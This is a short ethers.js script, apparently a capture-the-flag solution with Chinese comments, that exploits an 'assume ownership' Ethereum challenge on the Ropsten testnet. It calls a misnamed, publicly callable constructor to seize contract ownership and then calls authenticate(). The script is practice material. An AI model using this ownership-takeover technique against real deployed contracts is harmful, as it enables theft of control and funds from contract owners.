import {Contract, ethers} from 'ethers';
import { INFURA_ROPSTEN_URL, privateKey} from '../constant.js';



const provider = new ethers.providers.JsonRpcProvider(INFURA_ROPSTEN_URL)
const wallet = new ethers.Wallet(privateKey, provider)






const main = async() =>{
    // 题目合约实例
    const address = '0xDDE93bbC611Ae85dd9B89302d90125973d6fEe3f';
    const abi = [
        'function AssumeOwmershipChallenge() public',
        'function authenticate() public'
    ];

    const contract = new ethers.Contract(address, abi, wallet);

    const tx1 = await contract.AssumeOwmershipChallenge();
    await tx1.wait();
    console.log(tx1);
    
    console.log("tx1运行成功！！！！！！");


    const tx2 = await contract.authenticate();
    await tx2.wait();
    console.log(tx2);

}
await main();
console.log("程序运行结束！！！！！！");
